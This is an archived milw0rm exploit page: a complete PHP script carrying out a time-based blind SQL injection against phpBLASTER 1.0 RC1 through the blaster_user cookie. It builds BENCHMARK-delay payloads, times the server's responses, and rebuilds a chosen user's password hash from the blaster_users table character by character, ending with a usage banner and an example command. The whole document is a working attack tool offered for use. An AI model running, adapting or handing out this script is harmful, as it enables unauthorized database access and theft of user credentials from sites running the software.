<html><head><title>phpBLASTER 1.0 RC1 (blaster_user) Blind SQL Injection Exploit</title></head><pre>--+++============================================================+++--
--+++====== phpBLASTER 1.0 RC1 Blind SQL Injection Exploit ======+++--
--+++============================================================+++--

&lt;?php

function query ($username, $pos, $chr)
{
	$query = &quot;x' OR IF((ASCII(SUBSTRING((SELECT password FROM&quot;.
		 &quot; blaster_users WHERE username ='{$username}'),{$pos},1))={$chr}),BENCHMARK&quot;.
		 &quot;(200000000,CHAR(0)),0) OR 'x' = 'y&quot;;
	$query = str_replace (&quot; &quot;, &quot;%20&quot;, $query);
	$query = str_replace (&quot;'&quot;, &quot;%27&quot;, $query);
	return $query;
}

function exploit ($hostname, $path, $username, $pos, $chr)
{
	$chr = ord ($chr);
	$conn = fsockopen ($hostname, 80);

	$request = &quot;GET {$path}/html/mainfile.php HTTP/1.1\r\n&quot;.
		   &quot;Host: {$hostname}\r\n&quot;.
		   &quot;Cookie: blaster_user=&quot; . query ($username, $pos, $chr) . &quot;\r\n&quot;.
		   &quot;Connection: Close\r\n\r\n&quot;;
	
	$time_a = time ();

	fputs ($conn, $request);
	while (!feof ($conn))
		fgets ($conn, 1024);

	$time_b = time ();

	fclose ($conn);

	if ($time_b - $time_a &gt; 4)
		return true;
	else
		return false;
}

function run ($hostname, $path, $username)
{
	$key = &quot;abcdef0123456789&quot;;
	$chr = 0;
	$pos = 1;
	echo &quot;[+] Password: &quot;;
	while ($pos &lt;= 32)
	{
		if (exploit ($hostname, $path, $username, $pos, $key [$chr]))
		{
			echo $key [$chr];
			$chr = 0;
			$pos++;
		}
		else
			$chr++;
	}
	echo &quot;\n\n&quot;;
}

function usage ()
{
	exit (
		&quot;\nphpBLASTER 1.0 RC1 Blind SQL Injection Exploit&quot;.
		&quot;\n[+] Author   : darkjoker&quot;.
		&quot;\n[+] Site     : http://darkjoker.net23.net&quot;.
		&quot;\n[+] CMS Site : http://phpblaster.org&quot;.
		&quot;\n[+] Usage    : php xpl.php &lt;hostname&gt; &lt;path&gt; &lt;username&gt;&quot;.
		&quot;\n[+] Ex.      : php xpl.php localhost /phpBLASTER root&quot;.
		&quot;\n\n&quot;);
}



if ($argc != 4)
	usage ();

$hostname = $argv [1];
$path = $argv [2];
$username = $argv [3];

run ($hostname, $path, $username);

?&gt;

# milw0rm.com [2009-02-02]</pre></html>